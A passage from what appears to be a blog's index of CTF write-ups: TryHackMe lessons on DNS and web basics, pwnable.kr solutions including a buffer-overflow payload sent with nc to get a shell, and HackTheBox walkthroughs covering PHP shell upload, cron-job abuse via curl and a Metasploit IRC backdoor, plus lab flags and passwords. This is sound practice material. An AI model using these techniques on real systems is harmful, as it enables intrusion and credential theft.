the length must be kept to 253 characters or less. There is no limit to the number of subdomains you can create for your domain name.Answer the questions belowWhat is the maximum length of a subdomain? 63Which of the following characters cannot be used in a subdomain ( 3 b _ - )? _What is the maximum length of a domain name? 253What type of TLD is .co.uk? ccTLDRecord TypesDNS isn’t just for websites though, and multiple types of DNS record exist. We’ll go over some of the most common ones that you’re likely to come across.A RecordThese records resolve to IPv4 addresses, for example 104.26.10.229AAAA RecordThese records resolve to IPv6 addresses, for example 2606:4700:20::681a:be5CNAME RecordThese records resolve to another domain name, for example, TryHackMe’s online shop has the subdomain name store.tryhackme.com which returns a CNAME record shops.shopify.com. Another DNS request would then be made to shops.shopify.com to work out the IP address.MX RecordThese records resolve to the address of the servers that handle the email for the domain you are querying, for example an MX record response for tryhackme.com would look something like alt1.aspmx.l.google.com. These records also come with a priority flag. This tells the client in which order to try the servers, this is perfect for if the main server goes down and email needs to be sent to a backup server.TXT RecordTXT records are free text fields where any text-based data can be stored. TXT records have multiple uses, but some common ones can be to list servers that have the authority to send an email on behalf of the domain (this can help in the battle against spam and spoofed email). They can also be used to verify ownership of the domain name when signing up for third party services.Answer the questions belowWhat type of record would be used to advise where to send email? MXWhat type of record handles IPv6 addresses? AAAAMaking A Request When you request a domain name, your computer first checks its local cache to see if you’ve previously looked up the address recently; if not, a request to your Recursive DNS Server will be made. A Recursive DNS Server is usually provided by your ISP, but you can also choose your own. This server also has a local cache of recently looked up domain names. If a result is found locally, this is sent back to your computer, and your request ends here (this is common for popular and heavily requested services such as Google, Facebook, Twitter). If the request cannot be found locally, a journey begins to find the correct answer, starting with the internet’s root DNS servers. The root servers act as the DNS backbone of the internet; their job is to redirect you to the correct Top Level Domain Server, depending on your request. If, for example, you request www.tryhackme.com, the root server will recognise the Top Level Domain of .com and refer you to the correct TLD server that deals with .com addresses. The TLD server holds records for where to find the authoritative server to answer the DNS request. The authoritative server is often also known as the nameserver for the domain. For example, the name server for tryhackme.com is kip.ns.cloudflare.com and uma.ns.cloudflare.com. You’ll often find multiple nameservers for a domain name to act as a backup in case one goes down. An authoritative DNS server is the server that is responsible for storing the DNS records for a particular domain name and where any updates to your domain name DNS records would be made. Depending on the record type, the DNS record is then sent back to the Recursive DNS Server, where a local copy will be cached for future requests and then relayed back to the original client that made the request. DNS records all come with a TTL (Time To Live) value. This value is a number represented in seconds that the response should be saved for locally until you have to look it up again. Caching saves on having to make a DNS request every time you communicate with a server. Answer the questions belowWhat field specifies how long a DNS record should be cached for? TTLWhat type of DNS Server is usually provided by your ISP? recursiveWhat type of server holds all the records for a domain? authoritativePracticalUsing the website on the right, we can build requests to make DNS queries and view the results. The website will also show you the command you’d need to run on your own computer if you wished to make the requests yourself.Answer the questions belowWhat is the CNAME of shop.website.thm? shops.myshopify.comWhat is the value of the TXT record of website.thm? THM{7012BBA60997F35A9516C2E16D2944FF}What is the numerical priority value for the MX record? 30What is the IP address for the A record of www.website.thm? 10.10.10.10" }, { "title": "Putting it All Together", "url": "/posts/Putting-it-All-Together/", "categories": "Tryhackme, Pre Security", "tags": "server, cdn, load balancer, vhost", "date": "2021-07-03 00:00:00 +0530", "snippet": "Learn how all the individual components of the web work together to bring you access to your favourite web sites.Putting It All TogetherFrom the previous modules, you’ll have learned that quite a lot of things go on behind the scenes when you request a webpage in your browser.To summarise, when you request a website, your computer needs to know the server’s IP address it needs to talk to; for this, it uses DNS. Your computer then talks to the web server using a special set of commands called the HTTP protocol; the webserver then returns HTML, JavaScript, CSS, Images, etc., which your browser then uses to correctly format and display the website to you.There are also a few other components that help the web run more efficiently and provide extra features.Answer the questions belowI’ve read this… No answer needed.Other ComponentsLoad BalancersWhen a website’s traffic starts getting quite large or is running an application that needs to have high availability, one web server might no longer do the job. Load balancers provide two main features, ensuring high traffic websites can handle the load and providing a failover if a server becomes unresponsive.When you request a website with a load balancer, the load balancer will receive your request first and then forward it to one of the multiple servers behind it. The load balancer uses different algorithms to help it decide which server is best to deal with the request. A couple of examples of these algorithms are round-robin, which sends it to each server in turn, or weighted, which checks how many requests a server is currently dealing with and sends it to the least busy server.Load balancers also perform periodic checks with each server to ensure they are running correctly; this is called a health check. If a server doesn’t respond appropriately or doesn’t respond, the load balancer will stop sending traffic until it responds appropriately again.CDN (Content Delivery Networks)A CDN can be an excellent resource for cutting down traffic to a busy website. It allows you to host static files from your website, such a JavaScript, CSS, Images, Videos, and host them across thousands of servers all over the world. When a user requests one of the hosted files, the CDN works out where the nearest server is physically located and sends the request there instead of potentially the other side of the world.DatabasesOften websites will need a way of storing information for their users. Webservers can communicate with databases to store and recall data from them. Databases can range from just a simple plain text file up to complex clusters of multiple servers providing speed and resilience. You’ll come across some common databases: MySQL, MSSQL, MongoDB, GraphQL, Postgres, and more; each has its specific features.WAF (Web Application Firewall)A WAF sits between your web request and the web server; its primary purpose is to protect the webserver from hacking or denial of service attacks. It analyses the web requests for common attack techniques, whether the request is from a real browser rather than a bot. It also checks if an excessive amount of web requests are being sent by utilising something called rate limiting, which will only allow a certain amount of requests from an IP per second. If a request is deemed a potential attack, it will be dropped and never sent to the webserver.Answer the questions belowWhat can be used to host static files and speed up a clients visit to a website? CDNWhat does a load balancer perform to make sure a host is still alive? health checkWhat can be used to help against the hacking of a website? WAFHow Web Servers WorkWhat is a Web Server?A web server is a software that listens for incoming connections and then utilises the HTTP protocol to deliver web content to its clients. The most common web server software you’ll come across is Apache, Nginx, IIS and NodeJS. A Web server delivers files from what’s called its root directory, which is defined in the software settings. For example, Nginx and Apache share the same default location of /var/www/html in Linux operating systems, and IIS uses C:\\inetpub\\wwwroot for the Windows operating systems. So, for example, if you requested the file http://www.example.com/picture.jpg, it would send the file /var/www/html/picture.jpg from its local hard drive.Virtual HostsWeb servers can host multiple websites with different domain names; to achieve this, they use virtual hosts. The web server software checks the hostname being requested from the HTTP headers and matches that against its virtual hosts (virtual hosts are just text-based configuration files). If it finds a match, the correct website will be provided. If no match is found, the default website will be provided instead.Virtual Hosts can have their root directory mapped to different locations on the hard drive. For example, one.com being mapped to /var/www/website_one, and two.com being mapped to /var/www/website_twoThere’s no limit to the number of different websites you can host on a web server.Static Vs Dynamic ContentStatic content, as the name suggests, is content that never changes. Common examples of this are pictures, javascript, CSS, etc., but can also include HTML that never changes. Furthermore, these are files that are directly served from the webserver with no changes made to them.Dynamic content, on the other hand, is content that could change with different requests. Take, for example, a blog. On the homepage of the blog, it will show you the latest entries. If a new entry is created, the home page is then updated with the latest entry, or a second example might be a search page on a blog. Depending on what word you search, different results will be displayed.These changes to what you end up seeing are done in what is called the Backend with the use of programming and scripting languages. It’s called the Backend because what is being done is all done behind the scenes. You can’t view the websites’ HTML source and see what’s happening in the Backend, while the HTML is the result of the processing from the Backend. Everything you see in your browser is called the Frontend.Scripting and Backend LanguagesThere’s not much of a limit to what a backend language can achieve, and these are what make a website interactive to the user. Some examples of these languages (in no particular order :p) are PHP, Python, Ruby, NodeJS, Perl and many more. These languages can interact with databases, call external services, process data from the user, and so much more. A very basic PHP example of this would be if you requested the website http://example.com/index.php?name=adamIf index.php was built like this:&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;Hello &amp;lt;?php echo $_GET[&quot;name&quot;]; ?&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;It would output the following to the client:&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;Hello adam&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;You’ll notice that the client doesn’t see any PHP code because it’s on the Backend. This interactivity opens up a lot more security issues for web applications that haven’t been created securely, as you learn in further modules.Answer the questions belowWhat does web server software use to host multiple sites? Virtual HostsWhat is the name for the type of content that can change? DynamicDoes the client see the backend code? Yay/Nay NayQuizClick the “View Site” button on the right. Using everything you’ve learnt from the other modules, drag and drop the tiles into the correct order of how a request to a website works to reveal the flag.Note: When placing a tile in the correct position, it will highlight in green. When a tile is in the wrong spot, it will highlight in red. Make sure not to refresh the page, as it will reset the tiles all to blank again!Answer the questions belowFlag THM{YOU_GOT_THE_ORDER}" }, { "title": "How Website Works", "url": "/posts/How-Website-Workds/", "categories": "Tryhackme, Pre Security", "tags": "html, js, injection, info disclosure", "date": "2021-07-03 00:00:00 +0530", "snippet": "How websites workBy the end of this room, you’ll know how websites are created and will be introduced to some basic security issues.When you visit a website, your browser (like Safari or Google Chrome) makes a request to a web server asking for information about the page you’re visiting. It will respond with data that your browser uses to show you the page; a web server is just a dedicated computer somewhere else in the world that handles your requests.There are two major components that make up a website: Front End (Client-Side) - the way your browser renders a website. Back End (Server-Side) - a server that processes your request and returns a response.There are many other processes involved in your browser making a request to a web server, but for now, you just need to understand that you make a request to a server, and it responds with data your browser uses to render information to you.Answer the questions belowWhat term best describes the side your browser renders a website? Client SideHTMLWebsites are primarily created using: HTML, to build websites and define their structure CSS, to make websites look pretty by adding styling options JavaScript, implement complex features on pages using interactivityHyperText Markup Language (HTML) is the language websites are written in. Elements (also known as tags) are the building blocks of HTML pages and tells the browser how to display content. The code snippet below shows a simple HTML document, the structure of which is the same for every website:The HTML structure (as shown in the screenshot) has the following components: The &amp;lt;!DOCTYPE html&amp;gt; defines that the page is a HTML5 document. This helps with standardisation across different browsers and tells the browser to use HTML5 to interpret the page. The &amp;lt;html&amp;gt; element is the root element of the HTML page - all other elements come after this element. The &amp;lt;head&amp;gt; element contains information about the page (such as the page title) The &amp;lt;body&amp;gt; element defines the HTML document’s body; only content inside of the body is shown in the browser. The &amp;lt;h1&amp;gt; element defines a large heading The &amp;lt;p&amp;gt; element defines a paragraph There are many other elements (tags) used for different purposes. For example, there are tags for buttons (&amp;lt;button&amp;gt;), images (&amp;lt;img&amp;gt;), lists, and much more.Tags can contain attributes such as the class attribute which can be used to style an element (e.g. make the tag a different color) &amp;lt;p class=&quot;bold-text&quot;&amp;gt;, or the src attribute which is used on images to specify the location of an image: &amp;lt;img src=&quot;img/cat.jpg&quot;&amp;gt;.An element can have multiple attributes each with its own unique purpose, e.g., &amp;lt;p attribute1=&quot;value1&quot; attribute2=&quot;value2&quot;&amp;gt;.Elements can also have an id attribute (&amp;lt;p id=&quot;example&quot;&amp;gt;), which is unique to the element. Unlike the class attribute, where multiple elements can use the same class, an element must have different id’s to identify them uniquely. Element id’s are used for styling and to identify it by JavaScript.You can view the HTML of any website by right-clicking and selecting “View Page Source” (Chrome) / “Show Page Source” (Safari).Answer the questions belowLet’s play with some HTML! On the right-hand side, you should see a box that renders HTML - If you enter some HTML into the box and click the green “Render HTML Code” button, it will render your HTML on the page; you should see an image of some cats. No Answer neededOne of the images on the cat website is broken - fix it, and the image will reveal the hidden text answer! HTMLHEROAdd a dog image to the page by adding another img tag (&amp;lt;img&amp;gt;) on line 11. The dog image location is img/dog-1.png DOGHTMLJavaScriptJavaScript (JS) is one of the most popular coding languages in the world and allows pages to become interactive. HTML is used to create the website structure and content, while JavaScript is used to control the functionality of web pages - without JavaScript, a page would not have interactive elements and would always be static. JS can dynamically update the page in real-time, giving functionality to change the style of a button when a particular event on the page occurs (such as when a user clicks a button) or to display moving animations.JavaScript is added within the page source code and can be either loaded within &amp;lt;script&amp;gt; tags or can be included remotely with the src attribute: &amp;lt;script src=&quot;/location/of/javascript_file.js&quot;&amp;gt;&amp;lt;/script&amp;gt;The following JavaScript code finds a HTML element on the page with the id of “demo” and changes the element’s contents to “Hack the Planet” : document.getElementById(“demo”).innerHTML = “Hack the Planet”;HTML elements can also have events, such as “onclick” or “onhover” that execute JavaScript when the event occurs. The following code changes the text of the element with the demo ID to Button Clicked: &amp;lt;button onclick=&#39;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Button Clicked&quot;;&#39;&amp;gt;Click Me!&amp;lt;/button&amp;gt; - onclick events can also be defined inside the JavaScript script tags, and not on elements directly.Answer the questions belowClick the “View Site” button on this task. On the right-hand side, add JavaScript that changes the demo element’s content to “Hack the Planet” JSISFUNAdd the button HTML from this task that changes the element’s text to “Button Clicked” on the editor on the right, update the code by clicking the “Render HTML+JS Code” button and then click the button. No answer needed.Sensitive Data ExposureSensitive Data Exposure occurs when a website doesn’t properly protect (or remove) sensitive clear-text information to the end-user; usually found in a site’s frontend source code.We now know that websites are built using many HTML elements (tags), all of which we can see simply by “viewing the page source”. A website developer may have forgotten to remove login credentials, hidden links to private parts of the website or other sensitive data shown in HTML or JavaScript.Sensitive information can be potentially leveraged to further an attacker’s access within different parts of a web application. For example, there could be HTML comments with temporary login credentials, and if you viewed the page’s source code and found this, you could use these credentials to log in elsewhere on the application (or worse, used to access other backend components of the site).Whenever you’re assessing a web application for security issues, one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links.Answer the questions belowView the website on this task. What is the password hidden in the source code? testpasswdHTML InjectionHTML Injection is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website fails to sanitise user input (filter any “malicious” text that a user inputs into a website), and that input is used on the page, an attacker can inject HTML code into a vulnerable website.Input sanitisation is very important in keeping a website secure, as information a user inputs into a website is often used in other frontend and backend functionality. A vulnerability you’ll explore in another lab is database injection, where you can manipulate a database lookup query to log in as another user by controlling the input that’s directly used in the query - but for now, let’s focus on HTML injection (which is client-side).When a user has control of how their input is displayed, they can submit HTML (or JavaScript) code, and the browser will use it on the page, allowing the user to control the page’s appearance and functionality.The image above shows how a form outputs text to the page. Whatever the user inputs into the “What’s your name” field is passed to a JavaScript function and output to the page, which means if the user adds their own HTML or JavaScript in the field, it’s used in the sayHi function and is added to the page - this means you can add your own HTML (such as a &amp;lt;h1&amp;gt; tag) and it will output your input as pure HTML.The general rule is never to trust user input. To prevent malicious input, the website developer should sanitise everything the user enters before using it in the JavaScript function; in this case, the developer could remove any HTML tags.Answer the questions belowView the website on this task and inject HTML so that a malicious link to http://hacker.com is shown. HTML_INJ3CTI0N" }, { "title": "random", "url": "/posts/random/", "categories": "CTF, pwnable", "tags": "c, binary, pwn", "date": "2020-12-26 11:11:11 +0530", "snippet": "Daddy, teach me how to use random value in programming!ssh random@pwnable.kr -p2222 (pw:guest)ssh in the box and we got three files. flag,random and random.c.First we analyze the c code.#include &amp;lt;stdio.h&amp;gt;int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;); return 0;}it create random variable and asign it to rand() output.rand() generate randome number.next it declare variable key and asign it value 0.then it ask for our input and asign it to key.if block perform bitwise XOR operation between key and random number generated by rand(). then it compare it to 0xdeadbeef. if match then it gives us flag.bitwise XOR compare two binary value. if bits of two operands are opposite then it result in 1.eg :10010101-----1100here trick is if you use rand() without srand() it will generate same sequence of numbers each time it runs.so we have to find that first number which rand() generate.write a simple c program using rand()#include &amp;lt;stdio.h&amp;gt;int main(){ unsigned int random; random = rand(); printf(&quot;%d\\n&quot;, random); return 0;}compile it.random@pwnable:/tmp/demodir$ gcc -o test test.cgive execuation permission and run binary.random@pwnable:/tmp/demodir$ chmod +x testrandom@pwnable:/tmp/demodir$ ./test1804289383it gives number which rand() generate first time when we executes program.next we has to find key. we reverse the bitwise operation to get key.&amp;gt;&amp;gt;&amp;gt; 1804289383 ^ 0xdeadbeef3039230856now we have our key and random number to satisfy if condition.random@pwnable:~$ ./random 3039230856Good!Mommy, I thought libc random is unpredictable...and we got our flag. Mommy, I thought libc random is unpredictable…" }, { "title": "The Wall", "url": "/posts/The-Wall/", "categories": "Other, resources", "tags": "resources", "date": "2020-12-25 08:10:10 +0530", "snippet": "The people, books, and other things that influenced me.People[ ]Ippsec : ippsec has a YouTube channel where he posts ctf writeups. The amount of knowledge that he has obtained on the topic of hacking is tremendous.[ ] Traversy Media : Traversy Media Another YouTube channel where I start my full stack development journey.[ ] Daniel Miessler : Daniel Miessler Security Researcher and blog writer. I enjoy reading his stuff on a regular basis.[ ] Nikola Tesla : His work ethics have always fascinated me.Books[ ] Bhagwat Geeta[ ] Who moved my cheese?[ ] Sapiens: A Brief History of Humankind[ ] Rashmirathi[ ] Stories of Your Life and Others[ ] Women &amp;amp; Power[ ] frankenstein[ ] the curious case of benjamin button" }, { "title": "bof", "url": "/posts/BoF/", "categories": "CTF, pwnable", "tags": "buffer overflow, c, assembly", "date": "2020-12-25 04:23:32 +0530", "snippet": "AnalyzeLet’s start with source code.#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); }}int main(int argc, char* argv[]){ func(0xdeadbeef); return 0;}main function call func with argument 0xdeadbeef.lets take look at func()char overflowme[32];it create overflowme variable and asign 32 buffer space.printf(&quot;overflow me : &quot;);gets(overflowme);next it print “overflow me” and then read value from user.if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); }it check if key is equal to 0xcafebabe if yes then it give a shell otherwise it print Nah...ExploitationIn this challenge we doesn’t need to find offset and create shellcode.we just need to overwrite 0xdeadbeef with 0xcafebabe and we can spawn shell.lets play with binary in gdb.First we set breakpoint at main.gef➤ break main Breakpoint 1 at 0x68d gef➤ run Now program stop executing at main. Lets disassemble func and see how it work.gef➤ disass funcDump of assembler code for function func: 0x5655562c &amp;lt;+0&amp;gt;: push ebp 0x5655562d &amp;lt;+1&amp;gt;: mov ebp,esp 0x5655562f &amp;lt;+3&amp;gt;: sub esp,0x48 0x56555632 &amp;lt;+6&amp;gt;: mov eax,gs:0x14 0x56555638 &amp;lt;+12&amp;gt;: mov DWORD PTR [ebp-0xc],eax 0x5655563b &amp;lt;+15&amp;gt;: xor eax,eax 0x5655563d &amp;lt;+17&amp;gt;: mov DWORD PTR [esp],0x5655578c 0x56555644 &amp;lt;+24&amp;gt;: call 0xf7e3e330 &amp;lt;puts&amp;gt; 0x56555649 &amp;lt;+29&amp;gt;: lea eax,[ebp-0x2c] 0x5655564c &amp;lt;+32&amp;gt;: mov DWORD PTR [esp],eax 0x5655564f &amp;lt;+35&amp;gt;: call 0xf7e3d850 &amp;lt;gets&amp;gt; 0x56555654 &amp;lt;+40&amp;gt;: cmp DWORD PTR [ebp+0x8],0xcafebabe 0x5655565b &amp;lt;+47&amp;gt;: jne 0x5655566b &amp;lt;func+63&amp;gt; 0x5655565d &amp;lt;+49&amp;gt;: mov DWORD PTR [esp],0x5655579b 0x56555664 &amp;lt;+56&amp;gt;: call 0xf7e12f10 &amp;lt;system&amp;gt; 0x56555669 &amp;lt;+61&amp;gt;: jmp 0x56555677 &amp;lt;func+75&amp;gt; 0x5655566b &amp;lt;+63&amp;gt;: mov DWORD PTR [esp],0x565557a3 0x56555672 &amp;lt;+70&amp;gt;: call 0xf7e3e330 &amp;lt;puts&amp;gt; 0x56555677 &amp;lt;+75&amp;gt;: mov eax,DWORD PTR [ebp-0xc] 0x5655567a &amp;lt;+78&amp;gt;: xor eax,DWORD PTR gs:0x14 0x56555681 &amp;lt;+85&amp;gt;: je 0x56555688 &amp;lt;func+92&amp;gt; 0x56555683 &amp;lt;+87&amp;gt;: call 0xf7ee1930 &amp;lt;__stack_chk_fail&amp;gt; 0x56555688 &amp;lt;+92&amp;gt;: leave 0x56555689 &amp;lt;+93&amp;gt;: ret End of assembler dump.on 0x56555654 we can see it compare 0xcafebabe with func argument which is 0xdeadbeef.we set breakpoint exactly 0x56555654.Set breakpoint and continue executation.it ask for input. we provide bbbbbbbbbbbbbbb. here we need to provide short input because we don’t want to crash the program. we just want to see normal executation flow of program.gef➤ break *0x56555654Breakpoint 2 at 0x56555654gef➤ cContinuing.overflow me : bbbbbbbbbbbbbbb program hit our second breakpoint. now lets examine the memory.gef➤ x/50wx $esp0xffffd590: 0xffffd5ac 0x00000000 0xf7ffd000 0x000000000xffffd5a0: 0x00000000 0x00000000 0x56555034 0x626262620xffffd5b0: 0x62626262 0x62626262 0x00626262 0x5655549d0xffffd5c0: 0xf7fb33fc 0xffffffff 0x56556ff4 0x2afbe7000xffffd5d0: 0x56556ff4 0xf7fb3000 0xffffd5f8 0x5655569f0xffffd5e0: 0xdeadbeef 0x00000000 0x565556b9 0x000000000xffffd5f0: 0xf7fb3000 0xf7fb3000 0x00000000 0xf7decdf60xffffd600: 0x00000001 0xffffd6a4 0xffffd6ac 0xffffd6340xffffd610: 0xffffd644 0xf7ffdb40 0xf7fcd410 0xf7fb30000xffffd620: 0x00000001 0x00000000 0xffffd688 0x000000000xffffd630: 0xf7ffd000 0x00000000 0xf7fb3000 0xf7fb30000xffffd640: 0x00000000 0xa4e739cb 0xe6d067db 0x000000000xffffd650: 0x00000000 0x00000000here we can see our input we give b as 0x62. and at 0xffffd5e0 memory address 0xdeadbeef.Next we have to find out how many bytes we need to overwrite 0xdeadbeef. here we need 13*4=52 byets to overwrite 0xdeadbeef. now we can build our payload.python -c &#39;print &quot;a&quot; * 52 + &quot;\\xbe\\xba\\xfe\\xca&quot; &#39; &amp;gt; exploitwe save our payload as exploit and send this to server.➜ temp (cat exploit &amp;amp;&amp;amp; cat) | nc pwnable.kr 9000iduid=1008(bof) gid=1008(bof) groups=1008(bof)cat flagdaddy, I just pwned a buFFer :)" }, { "title": "File descriptor", "url": "/posts/fd/", "categories": "CTF, pwnable", "tags": "c, fd", "date": "2020-12-21 06:10:10 +0530", "snippet": "This challenges are hosted on pwnable.kr website.ssh fd@pwnable.kr -p2222 using password guest.we got three file.flag,fd.c and fdfc.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0;}lets breakdown the code.buf[32]create variable buf and asign 32 char of buffer space.if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; }check for argument if we doesn’t provide any argument it print pass argv[1] a numberint fd = atoi( argv[1] ) - 0x1234;create variable fd. atoi() function convert strings to interger. and it subtract in 0x1234 . 0x1234 is hex number which is 4660 in decimalint len = 0;define length variable and asign the value 0.len = read(fd, buf, 32);if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); }read() is a function that reads data previously written to a file.fd : means file descriptor. there are three type of file descriptor. stdin : standard input (0) stdout : standard output (1) stderr : standard output (2) when we run program and give input thats stdin when program gives output thats stdout. when pgogram gives us error that is stderr.here we have to control fd and make it 0 because read() need fd as 0 to read our input.then we get into if statement.if statement compare buf to LETMEWIN and print flag.we can control fd int fd = atoi( argv[1] ) - 0x1234; so if we subtract 4660 we get fd as 0 and we can get flag." }, { "title": "Curling", "url": "/posts/Curling/", "categories": "CTF, hackthebox", "tags": "joomla, cron, hexdump", "date": "2020-12-07 11:15:15 +0530", "snippet": "Curling is an easy box, which has a Joomla cms blog. we have to find the username and password on site. we did privs by using cron jobs.like every box we start with Nmap scanStarting Nmap 7.80 ( https://nmap.org ) at 2020-12-07 02:37 ESTNmap scan report for 10.10.10.150Host is up (0.23s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)| 256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)|_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.24 secondswe have a webpage and ssh lets take look at the webpage.we have a blog site. there is a login form. test sqli and some common user:pass but failed.by testing index page we found that the site uses PHP.by viewing source as well as by viewing Nmap result I found that it uses Joomlaby using ffuf we got a bunch of directories.administrator has a default Joomla login page.in the one of the blog post we got author name:Florisat the bottom of source code I see comment&amp;lt;!-- secret.txt --&amp;gt;in secret.txt we got some gibberish text.Q3VybGluZzIwMTghit looks like base64. after decoding we get:Curling2018!we can log in as floris:Curling2018! on the Joomla administration page.next, we try to upload the PHP shell.we upload shell in Extention » template » Beez3.we get shell as www-data user.txt is in floris home directory but we can’t access it. we have escalated our privileges.in the Floris home directory, there is the file password_backup which looks like hexdump.cat password_backup00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&amp;amp;SY...H..00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:400000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...`00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@......00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h..00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........400000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J..00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..&amp;lt;~.x00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .&amp;gt;...sVT.zH....100000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.&quot;000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R.000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p..000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*..000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P.000000f0: 819b bb48 ...Hby the BZh91AY&amp;amp;SY we know that it’s a bzip2 file. Let’s first put it back into binary format.xxd -r password_backup &amp;gt; newfilenow it’s bzip2 format. let’s decompress it by bzip2 -d newfilewe get another gzipafter decompressing for decade we got password. 5d&amp;lt;wdCbdZu)|hChXlllets ssh in Floris and get user.txtGetting rootin Floris home directory we see folder admin-area which has two files. input and report and the timestamp of two files keep changes every few minutes.let’s see if there any cronjob running as root.we got cronjob that takes input from input file and sends output in report file./bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportwe can get /etc/shadow and try to crack the password for the root user or we can replace ssh keys. here I just fetch for the root.txt file.we put url = &quot;file:///root/root.txt&quot; in input file." }, { "title": "Irked", "url": "/posts/Irked/", "categories": "CTF, hackthebox", "tags": "stego, irc, suid", "date": "2020-12-06 11:00:00 +0530", "snippet": "Irked is an easy box that has Backdoor Command Execution. we use the Metasploit module to gain a shell on the box. privs is done by using SUID.EnumerationAs always we start with Nmap. nmap -sV -sC -p- $ip &amp;gt; nmap/service.logStarting Nmap 7.80 ( https://nmap.org ) at 2020-12-06 04:20 ESTNmap scan report for 10.10.10.117Host is up (0.33s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Site doesn&#39;t have a title (text/html).111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100024 1 34818/udp status| 100024 1 38670/tcp status| 100024 1 47035/udp6 status|_ 100024 1 49457/tcp6 status6697/tcp open irc UnrealIRCd8067/tcp open irc UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 136.54 secondsIn the Nmap scan, we got typical ssh, HTTP service. aside from this we also have a UnrealIRCd installed.in the Nmap scan we see hostname irked.htb. Let’s add it in our host file /etc/hosts and start further enumeration.because HTTP has a broad scope of attack let’s start with HTTP.there is nothing interested on the webpage. we only got a smiley emoji. it may be has some steganography. so let’s download the image and start directory brute-forcing.we only have manual which is normal apache documentation.we do not have much on the webpage. so I decide to test for IRC.first, we connect the IRC using some random nickname and then try to enumerate some info.use INFO cmd to get info about the irc server.we got UnrealIRCd version.using searchsploit we found Backdoor Command Execution for the same version. exploit have Metasploit module so let’s fire up Metasploit and gain initial access.Gaining Shellusing /exploit/unix/irc/unreal_ircd_3281_backdoor module got shell on box.we got a shell on the box as an ircd user.i can’t find user.txt in ircd home directory. use find cmd to find out user.txtfind / -type f -name user.txt 2&amp;gt;/dev/nullI tried to read the user flag but we don’t have permission.so have to escalate our privileges to djmardovafter bit of enumeration i found .backup file in/home/djmardov/Documents directory.when we cat .backup file we got a password and a hint.it says this password for steg. we have only one image irked.jpg from the 